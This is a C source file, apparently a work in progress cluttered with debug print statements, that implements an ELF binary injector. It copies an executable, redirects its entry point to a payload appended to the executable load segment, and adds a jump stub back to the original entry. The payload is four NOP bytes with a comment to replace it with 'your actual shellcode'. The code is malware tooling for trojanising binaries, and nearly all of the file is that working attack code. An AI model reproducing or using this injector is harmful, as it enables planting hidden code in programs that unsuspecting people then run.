#include <elf.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

void clone_and_inject(const char *src_name, const char *dst_name, unsigned char *payload, size_t payload_sz) {
    int src_fd = open(src_name, O_RDONLY);
    if (src_fd < 0) { perror("source open"); exit(1); }

	printf("%d\n", __LINE__);
    off_t src_sz = lseek(src_fd, 0, SEEK_END);
	printf("%d\n", __LINE__);
    uint8_t *src_map = mmap(NULL, src_sz, PROT_READ, MAP_PRIVATE, src_fd, 0);
	printf("%d\n", __LINE__);
    if (src_map == MAP_FAILED) { perror("mmap"); exit(1); }

    // Create new file with same permissions (0755 for executable)
	printf("%d\n", __LINE__);
    int dst_fd = open(dst_name, O_RDWR | O_CREAT | O_TRUNC, 0755);
	printf("%d\n", __LINE__);
    if (dst_fd < 0) { perror("dest open"); exit(1); }

    // Copy original data to a working buffer so we can modify it
	printf("%d\n", __LINE__);
    uint8_t *work_buf = malloc(src_sz);
	printf("%d\n", __LINE__);
    memcpy(work_buf, src_map, src_sz);
	printf("%d\n", __LINE__);

	printf("%d\n", __LINE__);
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)work_buf;
	printf("%d\n", __LINE__);
    Elf64_Phdr *phdr = (Elf64_Phdr *)(work_buf + ehdr->e_phoff);
	printf("%d\n", __LINE__);
    Elf64_Addr old_entry = ehdr->e_entry;

    // 1. Prepare the Jump Stub (movabs rax, old_entry; jmp rax)
	printf("%d\n", __LINE__);
    unsigned char jmp_stub[] = {
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xff, 0xe0
    };
	printf("%d\n", __LINE__);
    memcpy(&jmp_stub[2], &old_entry, sizeof(old_entry));

	printf("%d\n", __LINE__);
    // 2. Find and expand the Executable PT_LOAD segment
    for (int i = ehdr->e_phnum - 1; i > 0; i--) {
		printf("%d|%p\n", __LINE__, &phdr[i]);
		printf("%p|%p\n", &phdr[i].p_type, &phdr[i].p_flags);
        if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & PF_X)) {
            // Virtual address for injection = end of this segment
		printf("%d\n", __LINE__);
            Elf64_Addr new_entry = phdr[i].p_vaddr + phdr[i].p_filesz;
            
		printf("%d\n", __LINE__);
            // Redirect Entry Point
		printf("%d\n", __LINE__);
            ehdr->e_entry = new_entry;

            // Update segment sizes to include payload + jump
		printf("%d\n", __LINE__);
            phdr[i].p_filesz += (payload_sz + sizeof(jmp_stub));
		printf("%d\n", __LINE__);
            phdr[i].p_memsz += (payload_sz + sizeof(jmp_stub));
		printf("%d\n", __LINE__);
            break;
        }
    }

    // 3. Assemble the New Binary
    // Write the modified original content (including patched headers)
    write(dst_fd, work_buf, src_sz);
    // Append the payload
    write(dst_fd, payload, payload_sz);
    // Append the jump stub
    write(dst_fd, jmp_stub, sizeof(jmp_stub));

	printf("%d\n", __LINE__);
    // Cleanup
    free(work_buf);
    munmap(src_map, src_sz);
    close(src_fd);
    close(dst_fd);
    printf("Successfully cloned and injected into: %s\n", dst_name);
}

int main(int argc, char **argv) {
    if (argc < 3) {
        printf("Usage: %s <source> <destination>\n", argv[0]);
        return 1;
    }

	printf("%d\n", __LINE__);
    // Example payload: Generic NOPs (Replace with your actual shellcode)
    unsigned char payload[] = { 0x90, 0x90, 0x90, 0x90 };
	printf("%d\n", __LINE__);

    clone_and_inject(argv[1], argv[2], payload, sizeof(payload));
	printf("%d\n", __LINE__);
    return 0;
}